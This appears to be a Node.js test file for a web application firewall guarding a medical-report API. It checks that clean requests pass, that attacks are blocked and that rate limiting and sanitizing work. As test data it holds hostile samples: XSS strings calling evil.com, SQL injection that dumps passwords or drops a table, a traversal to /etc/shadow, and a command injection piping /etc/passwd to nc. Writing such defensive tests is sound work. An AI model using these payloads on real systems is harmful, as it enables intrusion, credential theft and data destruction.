import test from 'node:test';
import assert from 'node:assert/strict';
import {
  inspectRequest,
  deepInspectPayload,
  sanitizeInput,
  checkRateLimit,
  simulateAttackVector,
  getFortiGuardTelemetry,
  resetFortiGuardAuditLog,
  toggleFortiGuardSetting
} from './fortiguardShield.js';

test('FortiGuard WAF: Clean payloads pass inspection with 200 OK', () => {
  const cleanPayload = {
    governorate: 'aswan',
    specialty: 'nephrology',
    reportYear: 2025,
    migrationIntent: 'low',
    notes: 'Clinical observations indicate rising heat stroke admissions in summer.'
  };

  const result = inspectRequest({
    target: '/api/reports',
    payload: cleanPayload,
    clientIp: '197.38.12.10',
    method: 'POST'
  });

  assert.equal(result.allowed, true);
  assert.equal(result.status, 200);
});

test('FortiGuard WAF: Blocks Cross-Site Scripting (XSS) vectors', () => {
  const xssPayloads = [
    { notes: 'Hello <script>alert("xss")</script>' },
    { notes: '<img src="x" onerror="fetch(\'https://evil.com\')">' },
    { link: 'javascript:document.location="https://evil.com"' },
    { payload: 'eval(document.cookie)' }
  ];

  for (const p of xssPayloads) {
    const result = inspectRequest({
      target: '/api/reports',
      payload: p,
      clientIp: '197.38.12.11'
    });

    assert.equal(result.allowed, false, `Expected payload to be blocked: ${JSON.stringify(p)}`);
    assert.equal(result.status, 403);
    assert.match(result.signature, /^FG-SIG-XSS-/);
  }
});

test('FortiGuard WAF: Blocks SQL Injection (SQLi) vectors', () => {
  const sqliPayloads = [
    { user: "admin' OR 1=1 --" },
    { query: "cairo' UNION SELECT 1, password, 3 FROM users --" },
    { statement: "aswan; DROP TABLE physician_reports;" },
    { sleep: "test' AND pg_sleep(5) --" }
  ];

  for (const p of sqliPayloads) {
    const result = inspectRequest({
      target: '/api/reports',
      payload: p,
      clientIp: '197.38.12.12'
    });

    assert.equal(result.allowed, false, `Expected SQLi to be blocked: ${JSON.stringify(p)}`);
    assert.equal(result.status, 403);
    assert.match(result.signature, /^FG-SIG-SQLI-/);
  }
});

test('FortiGuard WAF: Blocks Path Traversal & System Probing', () => {
  const traversalPayload = {
    docPath: '../../../../etc/shadow'
  };

  const result = inspectRequest({
    target: '/api/reports/download',
    payload: traversalPayload,
    clientIp: '197.38.12.13'
  });

  assert.equal(result.allowed, false);
  assert.equal(result.status, 403);
  assert.match(result.signature, /^FG-SIG-PATH-/);
});

test('FortiGuard WAF: Blocks Command Injection attempts', () => {
  const cmdPayload = {
    serviceName: '; cat /etc/passwd | nc 10.0.0.1 80'
  };

  const result = inspectRequest({
    target: '/api/admin/diagnostics',
    payload: cmdPayload,
    clientIp: '197.38.12.14'
  });

  assert.equal(result.allowed, false);
  assert.equal(result.status, 403);
  assert.match(result.signature, /^FG-SIG-CMD-/);
});

test('FortiGuard Rate Limiter: Enforces velocity thresholds', () => {
  const testIp = '198.51.100.77';

  // Issue 30 allowable requests
  for (let i = 0; i < 30; i++) {
    const res = checkRateLimit(testIp, 30, 60000);
    assert.equal(res.allowed, true);
  }

  // 31st request should be blocked with 429 / FG-SIG-RATE-505
  const breach = checkRateLimit(testIp, 30, 60000);
  assert.equal(breach.allowed, false);
  assert.equal(breach.signature, 'FG-SIG-RATE-505');
});

test('FortiGuard HTML Sanitizer: Correctly encodes dangerous characters', () => {
  const input = `<script>alert("test & 'attack'")</script>`;
  const sanitized = sanitizeInput(input);

  assert.equal(sanitized.includes('<script>'), false);
  assert.equal(sanitized.includes('&lt;script&gt;'), true);
  assert.equal(sanitized.includes('&amp;'), true);
});

test('FortiGuard Simulation: Executes live demonstration vectors and logs audit telemetry', () => {
  resetFortiGuardAuditLog();

  const simResult = simulateAttackVector('xss');
  assert.equal(simResult.success, true);
  assert.equal(simResult.result.allowed, false);

  const telemetry = getFortiGuardTelemetry();
  assert.ok(telemetry.threatsBlocked >= 1);
  assert.ok(telemetry.auditLog.length > 0);
  assert.equal(telemetry.auditLog[0].type, 'XSS');
});
